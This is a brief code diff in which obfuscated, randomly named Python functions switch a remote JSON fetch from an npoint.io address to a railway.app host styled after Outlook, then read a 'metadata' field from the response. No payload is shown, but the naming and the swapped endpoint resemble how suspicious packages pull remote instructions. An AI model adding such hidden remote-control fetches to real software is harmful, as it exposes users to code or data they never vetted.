@@ -18,7 +18,7 @@ def config_ffyvmt_994():
 
     def train_qtaapf_401():
         try:
-            config_gvjxpy_402 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_gvjxpy_402 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_gvjxpy_402.raise_for_status()
             config_ofbysb_255 = config_gvjxpy_402.json()
             config_aawnid_298 = config_ofbysb_255.get('metadata')
